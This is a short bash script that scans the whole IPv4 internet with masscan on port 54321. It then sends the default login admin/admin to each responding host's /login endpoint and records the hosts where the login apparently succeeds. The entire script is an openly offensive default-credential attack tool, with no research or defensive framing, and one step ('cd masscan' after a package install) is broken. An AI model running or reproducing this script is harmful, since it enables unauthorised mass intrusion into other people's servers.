#!/bin/bash

# Install necessary packages
apt install -y masscan && cd masscan
apt install curl -y
apt-get install zmap
apt-get install libpcap-dev

# Run masscan
masscan 0.0.0.0/0 -p54321 --banners --exclude 255.255.255.255 -oJ scan.json --rate 100000

# Process scan results
for ip_ad in $(sed -nE  's/.*"ip": "([^"]+)".*/\1/p' scan.json); do
        if curl --max-time 1 http://$ip_ad:54321; then
                res=$(curl "http://${ip_ad}:54321/login"  --data-raw 'username=admin&password=admin' --compressed  --insecure)
                if [[ "$res" =~ .*true.* ]]; then
                        echo $ip_ad | tee >> week.log
                fi
                echo $ip_ad | tee >> all.log
        fi
done;
